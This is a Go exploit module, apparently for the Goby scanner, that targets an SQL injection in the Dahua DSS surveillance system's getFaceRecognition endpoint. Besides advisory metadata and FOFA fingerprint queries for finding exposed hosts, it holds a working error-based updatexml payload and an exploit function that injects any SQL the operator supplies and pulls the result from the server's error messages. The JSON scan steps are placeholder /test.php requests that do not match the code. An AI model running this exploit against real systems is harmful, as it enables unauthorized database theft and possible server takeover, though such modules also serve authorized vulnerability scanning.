package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dahua-Dss /portal/services/carQuery/getFaceRecognition/searchJson/{}/pageJson/ SQL Injection Vulnerability",
    "Description": "<p>Dahua DSS digital monitoring system is a security video monitoring system developed by Dahua, which has real-time monitoring, PTZ operation, video playback, alarm processing, equipment management and other functions. </p>",
    "Product": "Dahua-DSS",
    "Homepage": "https://www.dahuatech.com/",
    "DisclosureDate": "2024-05-09",
    "PostTime": "2024-05-17",
    "Author": "2980611405@qq.com",
    "FofaQuery": "body=\"<meta http-equiv=\\\"refresh\\\" content=\\\"1;url='/admin'\\\"/>\" || body=\"dahuaDefined/headCommon.js\" || title==\"DSS\"",
    "GobyQuery": "body=\"<meta http-equiv=\\\"refresh\\\" content=\\\"1;url='/admin'\\\"/>\" || body=\"dahuaDefined/headCommon.js\" || title==\"DSS\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1.The official has not fixed the vulnerability yet. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></p><p>2.Deploy Web Application Firewall to monitor database operations. </p><p>3.if not necessary, prohibit public access to the system. </p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "database()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "大华DSS /portal/services/carQuery/getFaceRecognition/searchJson/{}/pageJson/ SQL 注入漏洞",
            "Product": "大华DSS数字监控系统",
            "Description": "<p>大华DSS数字监控系统是大华开发的一款安防视频监控系统，拥有实时监视、云台操作、录像回放、报警处理、设备管理等功能。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dahua-Dss /portal/services/carQuery/getFaceRecognition/searchJson/{}/pageJson/ SQL Injection Vulnerability",
            "Product": "Dahua-DSS",
            "Description": "<p>Dahua DSS digital monitoring system is a security video monitoring system developed by Dahua, which has real-time monitoring, PTZ operation, video playback, alarm processing, equipment management and other functions.&nbsp;<br></p>",
            "Recommendation": "<p>1.The official has not fixed the vulnerability yet. Please contact the manufacturer to fix the vulnerability:&nbsp;<a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></p><p>2.Deploy Web Application Firewall to monitor database operations.&nbsp;</p><p>3.if not necessary, prohibit public access to the system. <br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10953"
}`
	makeRegularAcs5 := func(RegularContent string, RegularUrl string) (string, error) {
	  reRequestAAAA := regexp.MustCompile(RegularUrl)
	  if !reRequestAAAA.MatchString(RegularContent) {
		return "", fmt.Errorf("can't match value")
	  }
	  getname := reRequestAAAA.FindStringSubmatch(RegularContent)
	  return getname[1], nil
	}

	sendPayloadsdjwix28 := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig(sql)
		cfg.VerifyTls = false
		cfg.Timeout = 15
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 500 {
			return nil, errors.New("not response 500")
		}
		if !strings.Contains(resp.Utf8Html, "XPATH") {
			return nil, errors.New("not info")
		}
		return httpclient.DoHttpRequest(hostInfo, cfg)

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `/portal/services/carQuery/getFaceRecognition/searchJson/{}/pageJson/{"orderBy":"1 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)--"}/extend/1`
      _, err := sendPayloadsdjwix28(hostInfo, sql)
			if err != nil {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/portal/services/carQuery/getFaceRecognition/searchJson/{}/pageJson/{"orderBy":"1 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)--"}/extend/1`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			sql = `/portal/services/carQuery/getFaceRecognition/searchJson/{}/pageJson/{"orderBy":"1 and 1=updatexml(1,concat(0x7e,(select ` + sql + `),0x7e),1)--"}/extend/1`
			if attackType == "sql" {
				resp, err := sendPayloadsdjwix28(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				respResult, err := makeRegularAcs5(resp.Utf8Html, `~([^~]+)~`)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Output = respResult
				expResult.Success = true
			} else if attackType == "sqlPoint" {
				_, err := sendPayloadsdjwix28(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				Payload :=`/portal/services/carQuery/getFaceRecognition/searchJson/{}/pageJson/{"orderBy":"1 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)--"}/extend/1`
				expResult.Output = `GET `+ Payload +` HTTP/1.1
				Host: ` + expResult.HostInfo.FixedHostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close`
			}
			return expResult
		},
	))
}